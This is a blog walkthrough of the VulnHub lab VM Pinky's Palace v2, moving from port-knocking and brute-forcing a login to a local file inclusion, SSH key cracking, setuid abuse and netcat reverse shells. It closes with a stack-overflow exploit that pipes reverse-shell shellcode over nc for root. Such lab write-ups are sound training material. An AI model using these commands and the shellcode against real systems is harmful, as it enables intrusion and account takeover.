---
layout: post
date: 2018-04-29 15:03:40 +0000
last_modified_at: 2018-07-01 16:13:12 +0000
title: "Pinky's Palace: v2 Walkthrough"
subtitle: "Surviving the Pink Dungeon"
category: Walkthrough
tags: [VulnHub, "Pinky's Palace"]
comments: true
image:
  feature: pinkys-palace-v2-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/the-pink-panther-drink-alcohol-1653913/
---

This post documents the complete walkthrough of Pinky's Palace: v2, a boot2root [VM][1] created by [Pink_Panther][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

This is a realistic and **hellish** (emphasis mine) boot2root, a name given to a safe and controlled environment (typically distributed as a virtual machine) where you can perform real-world penetration testing on intentionally vulnerable applications and/or services. You **boot** up the virtual machine and you **root** it. The ultimate goal is to gain `root` access and read `/root/root.txt`.

**Hint**: Map `pinkydb` to the assigned IP address in `/etc/hosts`.

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT      STATE    SERVICE REASON         VERSION
80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown no-response
7654/tcp  filtered unknown no-response
31337/tcp filtered Elite   no-response
```

`nmap` finds `80/tcp` open, no SSH service, and a bunch of filtered ports. Although I don't know what to make of the filtered ports now, they may prove interesting later. Who knows, right?

### Directory/File Enumeration

The combination of `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) is my go-to weapon and ammunition to fuzz for directories and/or files because they produce actionable results. Here, I find two WordPress installations and the presence of one interesting directory `/secret` in the host.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 http://pinkydb/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.10.130/FUZZ
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000015:  C=403     11 L	      32 W	    298 Ch	  ".htaccess"
000016:  C=403     11 L	      32 W	    298 Ch	  ".htpasswd"
016077:  C=301      9 L	      28 W	    317 Ch	  "secret"
016215:  C=403     11 L	      32 W	    302 Ch	  "server-status"
019909:  C=301      9 L	      28 W	    320 Ch	  "wordpress"
019949:  C=301      9 L	      28 W	    319 Ch	  "wp-admin"
019953:  C=301      9 L	      28 W	    321 Ch	  "wp-content"
019965:  C=301      9 L	      28 W	    322 Ch	  "wp-includes"
```

The directory `/secret` lists down the files in it and I find a text file `bambam.txt` with the following content.

```
# curl http://pinkydb/secret/bambam.txt
8890
7000
666

pinkydb
```

I get three numbers and `pinkydb` I already know is the host name.

### WordPress

The best tool, hands down and bar none, to scan for WordPress vulnerabilities and to identify users, is `wpscan`.

```
# wpscan --url pinkydb --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://pinkydb/
[+] Started: Fri Apr 27 02:19:10 2018
...
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+
```

`wpscan` finds no exploitable vulnerabilities and identifies one WordPress user `pinky1337`. Disappointed? Don't be. We are still in the beginning stages of enumeration.

While I was skimming through the blog, I spotted non-English words. Based on experience, there's a good chance one of these words is a password. I built a custom wordlist from the blog using `cewl`, and together with `hydra`, I attempted a dictionary attack on WordPress. Although none of the words yielded any results, the wordlist has not gone to waste. I could always use it when the need for another dictionary attack arises.

```
# cewl -m3 pinkydb 2>/dev/null | sed 1d | tee cewl.txt
# john --rules --wordlist=cewl.txt --stdout | tee wordlist.txt
```

### Knock Knock. Who's There?

Back to the numbers in `bambam.txt`. If I've to guess, I'd say I'm looking at port numbers (`0-65535`) and that suggests [port-knocking](https://en.wikipedia.org/wiki/Port_knocking).

Although we have three port numbers, the order or sequence of knocking, to unlock the ports, is unknown at this point.

To that end, I wrote a port-knocking script, `knock.sh`, to determine the correct sequence using `nmap`.

{% highlight bash linenos %}
#!/bin/bash

TARGET=$1

for ports in $(cat permutation.txt); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
    done
    sleep 3
    nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt
done
{% endhighlight %}

`permutation.txt` contains all the permutations of `8890,7000,666` and I use the following Python code to generate it.

```
python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq > permutation.txt
```

When `knock.sh` reaches the sequence `7000,666,8890`, it unlocks three more services, including the familiar SSH service.

```
# ./knock.sh 192.168.10.130
[*] Trying sequence 7000,666,8890...
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    syn-ack ttl 64 nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?  syn-ack ttl 64
| fingerprint-strings:
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   NULL:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|_    into Pinky's Palace.
```

Now that I know the correct sequence to unlock those ports, I can always use `nmap` to unlock them again.

```
# for p in 7000 666 8890; do nmap -n -v0 -Pn --max-retries 0 -p $p 192.168.10.130; done
```

The service at `tcp/7654` appears to be running `nginx`, while the service at `tcp/31337` appears to be `echo`ing whatever that's thrown at it.

### Pinky's Database

Pinky's Database Login (`http://pinkydb:7654/login.php`) is the attack surface we've been looking for!

![screenshot-1](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-1.png)

Remember the custom wordlist we built earlier? Now it's the time we put it to good use with `hydra`.

```
# echo pinky > usernames.txt
# echo pinky1337 >> usernames.txt
# hydra -L usernames.txt -P wordlist.txt -o hydra.txt -s 7654 pinkydb http-post-form /login.php:user=^USER^&pass=^PASS^:Invalid
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
[7654][http-post-form] host: pinkydb   login: pinky1337   password: entry
```

The credential (`pinky:Passione`) is the right one. Awesome.

![screenshot-2](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-2.png)

It's easy to spot the LFI vulnerability with `pageegap.php`. Also, notice something different? `pageegap` is a [palindrome](https://en.wikipedia.org/wiki/Palindrome). Creative file naming, eh?

![screenshot-3](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-3.png)

With the LFI vulnerability in mind, let's see if we can make use of it to display `/etc/passwd`.

```
# curl http://pinkydb:7654/pageegap.php?1337=/etc/passwd
root:x:0:0:root:/root:/bin/bash
...
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
demon:x:1001:1001::/home/demon:/bin/bash
stefano:x:1002:1002::/home/stefano:/bin/bash
```

`stefano` has an account in `pinkydb` and we have his SSH private key from above. I guess that's an open invitation to log in to his account via SSH.

I log in to find his RSA private key protected by a password. In case you are panicking, it's not difficult to use `ssh2john` and John the Ripper to recover the password.

```
# ssh2john id_rsa > id_rsa.hash
# john --show id_rsa.hash
id_rsa:secretz101
```

With the password out of the way, it's almost trivial to log in to `stefano`'s account.

![screenshot-4](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-4.png)

### Privilege Escalation

I notice `/home/stefano/tools/qsub` and `/usr/local/bin/backup.sh` during enumeration of `stefano`'s account; they may be key pieces to the privilege escalation puzzle. Here's why.

_Image shows `pinky` and `www-data` have the rights to read `qsub`._

![screenshot-5](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-5.png)

_Image shows `demon` and `pinky` have the rights to edit `backup.sh`._

![screenshot-6](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-6.png)

It's almost as if one thing leads to another.

To read `/home/stefano/tools/qsub` and to study it in greater detail, I need to be `pinky` or `www-data`. Since I don't know `pinky`'s password, the other way is to edit any of the `.php` files in `/var/www` (the home directory of `www-data`) where `stefano` has permission to write.

```
$ find /var/www -perm /o+w
/var/www/html/apache/wp-config.php
```

I edit `wp-config.php` to execute remote commands as `www-data`.

_Image shows that I can execute remote command on `pinkydb` as `www-data`._

![screenshot-7](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-7.png)

_Image shows `qsub` encoded in `base64`._

![screenshot-8](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-8.png)

I copy `qsub` over to my analysis machine, and decode it back to its binary form.

![screenshot-9](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-9.png)

Now that `qsub` is on my machine, I can perform reverse engineering, and after stepping through the `main()` and `send()` functions, this is what I discover:

* The program `qsub` has one argument—the message to `pinky`
* The input password is the value of the `TERM` environment variable, and must be less than or equal to forty characters
* The `send()` function is an abstraction for `/bin/echo [Message] >> /home/pinky/messages/stefano_msg.txt`

_The image shows `qsub` compares the input password with the value of the `TERM` environment variable_

![screenshot-10](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-10.png)

_The image shows `system()` library function executes shell command `/bin/echo` with output redirection to a file._

![screenshot-11](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-11.png)

Since I know how `qsub` works, and it has been `setuid` to `pinky`, I can exploit it to create `/home/pinky/.ssh/authorized_keys` with the RSA key pair I control.

Although the steps are slightly convoluted, the end result is deeply satisfactory:

1. Generate the RSA key pair on my machine
2. Exploit `qsub` to run a `netcat` reverse shell with `pinky`'s privileges
3. Copy and paste the RSA public key to `/home/pinky/.ssh/authorized_keys`
4. Log in to `pinky`'s account with the RSA private key

_Image shows the exploit on `qsub` to run `netcat` reverse shell._

![screenshot-17](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-17.png)

_Image shows copying and pasting the RSA public key to `/home/pinky/.ssh/authorized_keys`._

![screenshot-16](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-16.png)

_Image shows `pinky`'s account after logging in with the RSA private key._

![screenshot-12](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-12.png)

The ultimate aim of gaining control of `pinky`'s account is so that I can edit `/usr/local/bin/backup.sh`, add this line, and run a reverse shell as `demon`.

![screenshot-13](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-13.png)

I've set up a `netcat` listener on my machine to receive the reverse shell.

![screenshot-14](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-14.png)

Now, I can use the same Jedi trick of copying over the RSA public key I control, log in with SSH, and take full control of `demon`'s account.

![screenshot-15](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-15.png)

To recap, the work is far from complete; the final piece of the privilege escalation puzzle is in fact `/daemon/panel`.

![screenshot-18](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-18.png)

I use `scp` to grab a copy of `/daemon/panel` to my analysis machine (it runs 64-bit Kali Linux and replicates the conditions of `pinkydb` as close as possible) so that I can analyze it with `gdb` and [PEDA](https://github.com/longld/peda). To be more precise, I run `./panel` and attach `gdb` to it so that I can debug it—a dynamic analysis technique as opposed to reverse engineering.

![screenshot-19](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-19.png)

As seen above, ASLR is not disabled and the stack is executable.

Using `readelf`, I'm able to spot the `main()` function, along with the `handlecmd()` function, which I suppose handles the input provided to the program listening at `tcp/31337`.

![screenshot-20](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-20.png)

After disassembling the `handlecmd()` function with `gdb`, I place a breakpoint at `<handlecmd+70>` where I can analyze the stack overflow and the offset with which to control the RIP before the program takes back control.

![screenshot-21](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-21.png)

I create a 200-byte pattern with `pattern_create`, save it to a file, and then send it over to `./panel` listening at `tcp/31337`.

![screenshot-22](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-22.png)

`gdb` pauses the program at `<handlecmd+70>`.

![screenshot-23](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-23.png)

The command `pattern_offset` finds the pattern at an offset of 120 bytes.

![screenshot-24](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-24.png)

The basic exploit structure looks like this.

`perl -e 'print "A" x 120 . "BBBBBB"'` where `BBBBBB` is the return address we have yet to determine.

![screenshot-25](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-25.png)

Here we are, back at the breakpoint. Before `BBBBBB` returns, we see 120 `'A'`s followed by `BBBBBB` at the top of the stack. If we can find a return address with `jmp rsp` or `call rsp`, we are able to execute a 120-byte payload placed in the stack.

![screenshot-26](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-26.png)

Using the command `jmpcall`, we can pinpoint the exact address within `./panel` that has a `call rsp`. This is our return address.

We proceed to generate a payload with `msfvenom`. I prefer to use a single-stage reverse shell as the payload to a multi-stage one. Although single-stage payload has a bigger size, it gets everything done in shorter time.

![screenshot-27](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-27.png)

The generated payload is 119 bytes, and fits in nicely onto the given 120 bytes of space with one byte to spare. :smirk:

### Getting to the `root` of the matter

The stage is now set for the real privilege escalation. I run the following command on my machine.

```
# perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
```

A `root` shell appears on my `netcat` listener.

![screenshot-28](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-28.png)

After spawning a better looking shell with a bunch of keystrokes, the flag is basically there for the taking.

![screenshot-29](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-29.png)

:dancer:

### Afterthought

"Pinky's Palace" is a misnomer; it should be "Pinky's Dungeon", don't you think? :sweat_smile:

Walking through this "dungeon" took longer than usual because I had to document down the crucial sections and had to take more screen captures. It certainly lived up to its name of being harder than the first one—the twist and turns, the reverse engineering of `qsub`, and the exploit development for `panel`, all fun but tough challenges.

I give it a :+1:.

[1]: https://www.vulnhub.com/entry/pinkys-palace-v2,229/
[2]: https://twitter.com/@Pink_P4nther
[3]: https://www.vulnhub.com

*[ASLR]: Address Space Layout Randomization
*[LFI]: Local File Inclusion
*[RSA]: Rivest-Shamir-Adleman
*[SSH]: Secure Shell
